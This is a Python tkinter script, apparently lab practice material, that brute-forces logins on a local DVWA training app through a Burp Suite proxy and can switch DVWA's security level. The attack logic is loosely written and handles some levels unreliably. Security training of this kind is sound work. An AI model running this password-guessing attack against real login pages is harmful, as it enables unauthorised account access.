import requests
import tkinter as tk

# DVWA base URL (adjust as needed)
DVWA_LOGIN_URL = "http://localhost/dvwa/login.php"
DVWA_SECURITY_URL = "http://localhost/dvwa/security.php"
PROXY_URL = "http://127.0.0.1:8080"  # Burp Suite proxy address

# Function to change security level
def change_security_level(security_level):
    # Prepare data for the security level change request
    data = {
        'security': security_level,
        'seclev_submit': 'Submit'
    }

    # Send the request to change the security level directly to DVWA
    response = requests.post(DVWA_SECURITY_URL, data=data)

    # Check if the security level change was successful
    if f"Security level is now {security_level.capitalize()}" in response.text:
        result_label.config(text=f"Security level changed to {security_level.capitalize()}")
    else:
        result_label.config(text="Failed to change security level")

# Function to perform brute force attack
def perform_brute_force(username, password_list):
    # Configure proxy settings for Burp Suite
    proxies = {
        'http': PROXY_URL,
        'https': PROXY_URL
    }

    # Send the login request to DVWA through Burp Suite proxy
    def send_login_request(password):
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        return requests.post(DVWA_LOGIN_URL, data=data, proxies=proxies)

    # Get the selected security level
    security_level = security_var.get()

    # Iterate through the password list
    for password in password_list:
        response = send_login_request(password)

        # Check if the login was successful based on the security level
        if (security_level == "low" and "Welcome to the password protected area" in response.text) or \
           (security_level == "medium" and "Welcome to the password protected area" in response.text and "Impossible" not in response.text) or \
           (security_level == "high" and "Impossible" not in response.text):
            result_label.config(text=f"Successful login! Password: {password}")
            return

    result_label.config(text="Brute force attack unsuccessful")

# TKinter GUI setup
root = tk.Tk()
root.title("Brute Force Attack with Burp Suite")

# Username entry
username_label = tk.Label(root, text="Username:")
username_label.grid(row=0, column=0, padx=10, pady=10)

username_entry = tk.Entry(root)
username_entry.grid(row=0, column=1, padx=10, pady=10)

# Password list entry
password_label = tk.Label(root, text="Password List (comma-separated):")
password_label.grid(row=1, column=0, padx=10, pady=10)

password_entry = tk.Entry(root)
password_entry.grid(row=1, column=1, padx=10, pady=10)

# Security level selection
security_label = tk.Label(root, text="Security Level:")
security_label.grid(row=2, column=0, padx=10, pady=10)

security_var = tk.StringVar(root)
security_var.set("low")  # Default selection

security_option = tk.OptionMenu(root, security_var, "low", "medium", "high", "impossible")
security_option.grid(row=2, column=1, padx=10, pady=10)

# Button to change security level
change_security_button = tk.Button(root, text="Change Security Level", command=lambda: change_security_level(security_var.get()))
change_security_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

# Button to trigger attack
attack_button = tk.Button(root, text="Perform Brute Force Attack", command=lambda: perform_brute_force(username_entry.get(), password_entry.get().split(",")))
attack_button.grid(row=4, column=0, columnspan=2, padx=10, pady=10)

# Label to display attack result
result_label = tk.Label(root, text="")
result_label.grid(row=5, column=0, columnspan=2, padx=10, pady=10)

# Start the TKinter event loop
root.mainloop()
